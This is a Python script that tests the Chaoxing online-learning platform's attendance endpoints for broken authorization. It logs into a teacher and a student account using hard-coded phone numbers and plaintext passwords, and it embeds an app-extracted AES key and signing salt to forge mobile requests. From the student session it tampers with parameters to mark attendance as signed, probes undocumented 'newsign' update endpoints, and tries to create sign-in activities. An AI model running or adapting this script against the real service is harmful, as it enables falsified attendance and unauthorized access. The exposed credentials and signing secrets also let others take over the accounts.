import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"
TEST_AID = "5000163767353"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = any(kw in detail.lower() for kw in ["success", "修改成功"]) or '"state":"success"' in evidence
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"关键漏洞验证：stuSignajax+status参数 & changeSign端点")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n[2] 详细分析活动列表")
    print("=" * 80)

    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []

    all_aids = []
    for act in active_list:
        aid = str(act.get("id", ""))
        all_aids.append(aid)
        print(f"\n  aid={aid}")
        print(f"    原始数据: {json.dumps(act, ensure_ascii=False)[:300]}")

    print("\n[3] 检查每个活动的签到状态")
    print("=" * 80)

    for aid in all_aids[:5]:
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        print(f"\n  aid={aid}:")
        print(f"    {json.dumps(d, ensure_ascii=False)[:400]}")

    print("\n[4] 关键测试：stuSignajax+status参数（在已签到活动上）")
    print("=" * 80)

    test_aid = all_aids[0] if all_aids else TEST_AID

    test_cases = [
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "status": "2"},
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "status": "0"},
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "status": "2", "signType": "5"},
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "status": "2", "isModify": "1"},
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "status": "2", "type": "modify"},
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "status": "2", "operate": "modify"},
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "status": "2", "action": "update"},
        {"activeId": test_aid, "uid": puid_s, "classId": CLASS_ID, "courseId": COURSE_ID, "status": "2", "source": "teacher"},
    ]

    for i, params in enumerate(test_cases):
        r = s_s.post(f"{base}/pptSign/stuSignajax", data=params,
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                     timeout=20)
        extra = ", ".join(f"{k}={v}" for k, v in params.items() if k not in ["activeId", "uid", "classId", "courseId"])
        rec(f"T4-stuSignajax-{i}", f"stuSignajax({extra}): {r.text[:100]}", r.text[:300])

    print("\n[5] changeSign端点详细测试")
    print("=" * 80)

    for aid in all_aids[:3]:
        r = s_s.post(f"{base}/pptSign/changeSign",
                     data={"activeId": aid, "uid": puid_s, "classId": CLASS_ID,
                           "courseId": COURSE_ID, "status": "2"},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        rec(f"T5-changeSign-{aid[:8]}",
            f"学生POST changeSign(aid={aid[:8]}): HTTP {r.status_code}, len={len(r.text)}", r.text[:500])

        if r.status_code == 200 and len(r.text) > 50:
            html_content = r.text
            js_urls = re.findall(r'src=["\']([^"\']*\.js[^"\']*)["\']', html_content)
            api_refs = re.findall(r'(?:fetch|ajax|post|get)\s*\(?[\'"]([^\'"]+sign[^\'"]*)', html_content, re.I)
            form_actions = re.findall(r'action=["\']([^"\']*)["\']', html_content)
            status_refs = re.findall(r'status[^;]{0,80}', html_content)
            update_refs = re.findall(r'updateSign[^"\';\s]{0,50}', html_content)
            print(f"    JS: {js_urls[:3]}")
            print(f"    API: {api_refs[:3]}")
            print(f"    Forms: {form_actions[:3]}")
            print(f"    Status: {status_refs[:3]}")
            print(f"    Update: {update_refs[:3]}")

    print("\n[6] 教师端changeSign对比测试")
    print("=" * 80)

    for aid in all_aids[:2]:
        r = s_t.post(f"{base}/pptSign/changeSign",
                     data={"activeId": aid, "uid": puid_t, "classId": CLASS_ID,
                           "courseId": COURSE_ID, "status": "2"},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        rec(f"T6-teacher-changeSign-{aid[:8]}",
            f"教师POST changeSign(aid={aid[:8]}): HTTP {r.status_code}, len={len(r.text)}", r.text[:500])

    print("\n[7] newsign路径下的API探索")
    print("=" * 80)

    newsign_apis = [
        f"{base}/newsign/updateSignStatusByUidsV2",
        f"{base}/newsign/updateSignStatus",
        f"{base}/newsign/stuSignajax",
        f"{base}/newsign/changeSign",
        f"{base}/newsign/doSign",
        f"{base}/newsign/signIn",
        f"{base}/newsign/modifySign",
        f"{base}/newsign/editSign",
    ]

    for url in newsign_apis:
        try:
            r = s_s.post(url,
                         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": test_aid},
                         data={"uids": STUDENT_PUID, "status": "2", "remark": "",
                               "activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                               "uid": puid_s},
                         headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                  "Content-Type": "application/x-www-form-urlencoded"},
                         timeout=15)
            short_name = url.split("/")[-1][:25]
            rec(f"T7-newsign-{short_name}",
                f"学生 POST newsign/{short_name}: HTTP {r.status_code}, {r.text[:100]}", r.text[:300])
        except Exception as e:
            short_name = url.split("/")[-1][:25]
            rec(f"T7-newsign-{short_name}", f"ERROR: {str(e)[:80]}")

    print("\n[8] 尝试教师创建新签到活动（不同API路径）")
    print("=" * 80)

    create_attempts = [
        (f"{base}/pptSign/startSign", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t, "signType": "0"}),
        (f"{base}/ppt/activeAPI/pptActive", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t, "signType": "0", "type": "2"}),
        (f"{base}/ppt/activeAPI/addActive", {"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_t, "signType": "0", "type": "2"}),
    ]

    for url, data in create_attempts:
        try:
            r = s_t.post(url, data=data,
                         headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                  "Content-Type": "application/x-www-form-urlencoded"},
                         timeout=20)
            rec(f"T8-create-{url.split('/')[-1][:20]}",
                f"教师创建: HTTP {r.status_code}, {r.text[:150]}", r.text[:300])
        except Exception as e:
            rec(f"T8-create-{url.split('/')[-1][:20]}", f"ERROR: {e}")

    print("\n[9] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "stu_sign_status_test_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if '"state":"success"' in r.get("evidence", ""))
    perm = sum(1 for r in results if "无权限" in r.get("detail", "") or "无权限" in r.get("evidence", ""))
    print(f"  成功: {success}, 无权限: {perm}")

if __name__ == "__main__":
    run()
